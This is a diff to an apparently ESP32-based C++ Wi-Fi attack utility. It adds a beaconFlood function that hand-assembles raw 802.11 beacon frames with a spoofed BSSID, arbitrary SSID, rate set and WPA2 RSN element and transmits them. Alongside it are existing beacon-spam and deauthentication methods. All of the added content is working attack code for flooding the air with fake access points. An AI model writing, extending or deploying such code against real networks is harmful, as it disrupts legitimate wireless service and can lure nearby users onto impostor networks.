@@ -29,6 +29,8 @@ esp_err_t WifiAttackUtil::setChannel(uint8_t channel)
 
 esp_err_t WifiAttackUtil::_changeChannel(const uint8_t channel) noexcept
 {
+  if (channel == _currentChannel) return ESP_OK;
+  _currentChannel = channel;
   return esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
 }
 
@@ -109,6 +111,56 @@ esp_err_t WifiAttackUtil::beaconSpam(const char* ssid, const uint8_t channel)
   }
 
   return ESP_OK;
+}
+
+esp_err_t WifiAttackUtil::beaconFlood(const uint8_t* bssid, const char* ssid, const uint8_t channel)
+{
+  esp_err_t res = _changeChannel(channel);
+  if (res != ESP_OK) return res;
+
+  const size_t ssidLen = strnlen(ssid, 32);
+
+  uint8_t pkt[109];
+  size_t  n = 0;
+
+  pkt[n++] = 0x80; pkt[n++] = 0x00;
+  pkt[n++] = 0x00; pkt[n++] = 0x00;
+  pkt[n++] = 0xFF; pkt[n++] = 0xFF; pkt[n++] = 0xFF;
+  pkt[n++] = 0xFF; pkt[n++] = 0xFF; pkt[n++] = 0xFF;
+  memcpy(&pkt[n], bssid, 6); n += 6;
+  memcpy(&pkt[n], bssid, 6); n += 6;
+  const size_t seqOff = n;
+  pkt[n++] = 0x00; pkt[n++] = 0x00;
+
+  memset(&pkt[n], 0, 8); n += 8;
+  pkt[n++] = 0xE8; pkt[n++] = 0x03;
+  pkt[n++] = 0x31; pkt[n++] = 0x00;
+
+  pkt[n++] = 0x00;
+  pkt[n++] = (uint8_t)ssidLen;
+  memcpy(&pkt[n], ssid, ssidLen); n += ssidLen;
+
+  pkt[n++] = 0x01; pkt[n++] = 0x08;
+  pkt[n++] = 0x82; pkt[n++] = 0x84; pkt[n++] = 0x8B; pkt[n++] = 0x96;
+  pkt[n++] = 0x24; pkt[n++] = 0x30; pkt[n++] = 0x48; pkt[n++] = 0x6C;
+
+  pkt[n++] = 0x03; pkt[n++] = 0x01; pkt[n++] = channel;
+
+  pkt[n++] = 0x30; pkt[n++] = 0x18;
+  pkt[n++] = 0x01; pkt[n++] = 0x00;
+  pkt[n++] = 0x00; pkt[n++] = 0x0F; pkt[n++] = 0xAC; pkt[n++] = 0x02;
+  pkt[n++] = 0x02; pkt[n++] = 0x00;
+  pkt[n++] = 0x00; pkt[n++] = 0x0F; pkt[n++] = 0xAC; pkt[n++] = 0x04;
+  pkt[n++] = 0x00; pkt[n++] = 0x0F; pkt[n++] = 0xAC; pkt[n++] = 0x04;
+  pkt[n++] = 0x01; pkt[n++] = 0x00;
+  pkt[n++] = 0x00; pkt[n++] = 0x0F; pkt[n++] = 0xAC; pkt[n++] = 0x02;
+  pkt[n++] = 0x00; pkt[n++] = 0x00;
+
+  uint16_t sc = (uint16_t)((_sequenceNumber & 0x0FFF) << 4);
+  pkt[seqOff]     = (uint8_t)(sc & 0xFF);
+  pkt[seqOff + 1] = (uint8_t)(sc >> 8);
+  _sequenceNumber++;
+  return _sendPacket(pkt, n);
 }
 
 esp_err_t WifiAttackUtil::deauthenticate(const MacAddr ap, const MacAddr bssid, const uint8_t channel)
